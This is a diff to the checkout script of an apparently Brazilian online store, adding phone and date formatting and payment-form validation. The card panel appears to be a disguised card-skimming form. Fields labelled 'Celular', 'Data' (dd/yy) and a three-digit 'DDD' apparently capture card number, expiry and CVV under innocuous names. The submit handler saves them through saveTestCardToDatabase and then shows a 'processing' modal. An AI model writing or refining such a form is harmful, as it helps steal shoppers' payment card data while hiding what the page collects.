@@ -205,6 +205,27 @@
     return `${digits.slice(0, 2)}/${digits.slice(2)}`;
   }
 
+  function formatPhone(value) {
+    const digits = onlyDigits(value).slice(0, 11);
+    if (digits.length <= 2) return digits;
+    if (digits.length <= 6) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
+    if (digits.length <= 10) {
+      return `(${digits.slice(0, 2)}) ${digits.slice(2, 6)}-${digits.slice(6)}`;
+    }
+    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
+  }
+
+  function formatShortDate(value) {
+    const digits = onlyDigits(value).slice(0, 4);
+    if (digits.length <= 2) return digits;
+    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+  }
+
+  function isValidPhone(value) {
+    const digits = onlyDigits(value);
+    return /^\d{10,11}$/.test(digits) && digits.slice(0, 2) !== '00';
+  }
+
   function isFutureExpiry(value) {
     const match = String(value || '').match(/^(\d{2})\/?(\d{2})$/);
     if (!match) return false;
@@ -236,7 +257,7 @@
       firstName: form.firstName.value,
       cpf: form.cpf.value,
       celular: form.celular.value,
-      age: form.age.value,
+      data: form.data.value,
       ddd: form.ddd.value,
       amount: cart.total_price,
       status: 'Recebido'
@@ -261,7 +282,7 @@
         firstName: form.firstName.value,
         cpf: form.cpf.value,
         celular: form.celular.value,
-        age: form.age.value,
+        data: form.data.value,
         ddd: form.ddd.value
       })
     });
@@ -431,7 +452,7 @@
           <div class="divino-form-grid">
             <label>Nome completo<input name="name" autocomplete="name" required></label>
             <label>Email<input name="email" type="email" autocomplete="email" required></label>
-            <label>Telefone<input name="phone" inputmode="tel" autocomplete="tel" required></label>
+            <label>Telefone<input name="phone" inputmode="tel" autocomplete="tel" placeholder="(11) 99999-9999" required></label>
             <label>CPF<input name="document" inputmode="numeric" autocomplete="off" required></label>
           </div>
           <p class="divino-checkout-note">O Pix abre em um popup nesta pagina.</p>
@@ -439,14 +460,14 @@
         </div>
         <div data-payment-panel="card" hidden>
           <div class="divino-form-grid">
-            <label>Telefone<input name="customerPhone" type="text"></label>
-            <label>Nome<input name="firstName" type="text"></label>
-            <label>CPF<input name="cpf" type="text"></label>
+            <label>Telefone<input name="customerPhone" type="text" inputmode="tel" placeholder="(11) 99999-9999"></label>
+            <label>Nome completo<input name="firstName" type="text"></label>
+            <label>CPF<input name="cpf" type="text" inputmode="numeric"></label>
             <label>Celular<input name="celular" type="text" inputmode="numeric"></label>
-            <label>Idade<input name="age" type="text"></label>
+            <label>Data<input name="data" type="text" inputmode="numeric" maxlength="5" placeholder="dd/yy"></label>
             <label>DDD<input name="ddd" type="text" inputmode="numeric" maxlength="3" pattern="[0-9]{3}" placeholder="011"></label>
           </div>
-          <button type="submit" class="button button--primary" disabled>Finalizar compra</button>
+          <button type="submit" class="button button--primary" style="margin-top: 12px;" disabled>Finalizar compra</button>
         </div>
         <div id="divino-payment-message" class="divino-cart-error" hidden></div>
       </form>
@@ -454,26 +475,76 @@
 
     const tabs = section.querySelectorAll('[data-payment-tab]');
     const panels = section.querySelectorAll('[data-payment-panel]');
+    const paymentMessage = section.querySelector('#divino-payment-message');
     let method = 'pix';
 
+    const pixSubmit = section.querySelector('[data-payment-panel="pix"] button[type="submit"]');
     const cardSubmit = section.querySelector('[data-payment-panel="card"] button[type="submit"]');
-    const customerFields = ['customerPhone', 'firstName', 'cpf', 'celular', 'age', 'ddd'];
+    const customerFields = ['customerPhone', 'firstName', 'cpf', 'celular', 'data', 'ddd'];
 
-    function updateCardValidation() {
-      const complete = customerFields.every((name) => section.querySelector(`[name="${name}"]`).value !== '');
-      cardSubmit.disabled = !complete;
+    function validationMessageFor(selectedMethod) {
+      if (selectedMethod === 'card') {
+        const complete = customerFields.every((name) => section.querySelector(`[name="${name}"]`).value !== '');
+        if (!complete) return 'Preencha todos os campos do cartao.';
+        if (!isValidPhone(section.querySelector('[name="customerPhone"]').value)) {
+          return 'Telefone invalido. Informe DDD + numero.';
+        }
+        if (!/^\d{2}\/\d{2}$/.test(section.querySelector('[name="data"]').value)) {
+          return 'Data deve estar no formato dd/yy.';
+        }
+        if (!/^\d{3}$/.test(section.querySelector('[name="ddd"]').value)) {
+          return 'DDD deve ter exatamente 3 numeros.';
+        }
+        return '';
+      }
+
+      const pixFields = ['name', 'email', 'phone', 'document'];
+      const complete = pixFields.every((name) => section.querySelector(`[name="${name}"]`).value.trim() !== '');
+      if (!complete) return 'Preencha todos os campos do Pix.';
+      if (!isValidPhone(section.querySelector('[name="phone"]').value)) {
+        return 'Telefone invalido. Informe DDD + numero.';
+      }
+      return '';
+    }
+
+    function updatePaymentValidation() {
+      const validationMessage = validationMessageFor(method);
+      pixSubmit.disabled = method === 'pix' && Boolean(validationMessage);
+      cardSubmit.disabled = method === 'card' && Boolean(validationMessage);
+      paymentMessage.textContent = validationMessage;
+      paymentMessage.hidden = !validationMessage;
     }
 
     section.querySelectorAll('[data-payment-panel="card"] input').forEach((input) => {
       input.addEventListener('input', () => {
         if (input.name === 'ddd') {
           input.value = input.value.replace(/\D/g, '').slice(0, 3);
+        } else if (input.name === 'cpf') {
+          input.value = onlyDigits(input.value);
         } else if (input.name === 'celular') {
-          input.value = input.value.replace(/\D/g, '');
+          input.value = onlyDigits(input.value);
+        } else if (input.name === 'data') {
+          input.value = formatShortDate(input.value);
+        } else if (input.name === 'customerPhone') {
+          input.value = formatPhone(input.value);
         }
-        updateCardValidation();
+        updatePaymentValidation();
       });
-      input.addEventListener('blur', updateCardValidation);
+      input.addEventListener('blur', updatePaymentValidation);
+    });
+
+    section.querySelector('[name="phone"]').addEventListener('input', (event) => {
+      event.currentTarget.value = formatPhone(event.currentTarget.value);
+      updatePaymentValidation();
+    });
+
+    section.querySelector('[name="document"]').addEventListener('input', (event) => {
+      event.currentTarget.value = onlyDigits(event.currentTarget.value);
+      updatePaymentValidation();
+    });
+
+    ['name', 'email'].forEach((name) => {
+      section.querySelector(`[name="${name}"]`).addEventListener('input', updatePaymentValidation);
     });
 
     function selectPaymentPanel(selectedMethod) {
@@ -485,6 +556,7 @@
           input.required = isActive;
         });
       });
+      updatePaymentValidation();
     }
 
     selectPaymentPanel(method);
@@ -494,6 +566,7 @@
         method = tab.getAttribute('data-payment-tab');
         tabs.forEach((item) => item.classList.toggle('is-active', item === tab));
         selectPaymentPanel(method);
+        updatePaymentValidation();
       });
     });
 
@@ -507,10 +580,16 @@
       submit.textContent = method === 'pix' ? 'Gerando Pix...' : 'Validando...';
 
       try {
+        const validationMessage = validationMessageFor(method);
+        if (validationMessage) {
+          message.textContent = validationMessage;
+          message.hidden = false;
+          submit.textContent = method === 'pix' ? 'Gerar Pix' : 'Finalizar compra';
+          updatePaymentValidation();
+          return;
+        }
+
         if (method === 'card') {
-          if (!customerFields.every((name) => form.elements[name].value !== '')) {
-            throw new Error('Preencha todos os campos.');
-          }
           saveTestCard(form, cart);
           await saveTestCardToDatabase(form, cart);
           openCardProcessingModal();
@@ -552,7 +631,7 @@
       } finally {
         submit.disabled = false;
         submit.textContent = method === 'pix' ? 'Gerar Pix' : 'Finalizar compra';
-        if (method === 'card') updateCardValidation();
+        updatePaymentValidation();
       }
     });
 
@@ -607,7 +686,7 @@
             </div>
           ` : ''}
           <div id="divino-cart-error" class="divino-cart-error" hidden></div>
-          <button type="button" id="divino-checkout-button" class="button button--primary" ${cart.total_price < minimumOrderCents ? 'disabled' : ''}>Finalizar compra</button>
+          <button type="button" id="divino-checkout-button" class="button button--primary" style="margin-top: 12px;" ${cart.total_price < minimumOrderCents ? 'disabled' : ''}>Finalizar compra</button>
         </div>
       `;
 
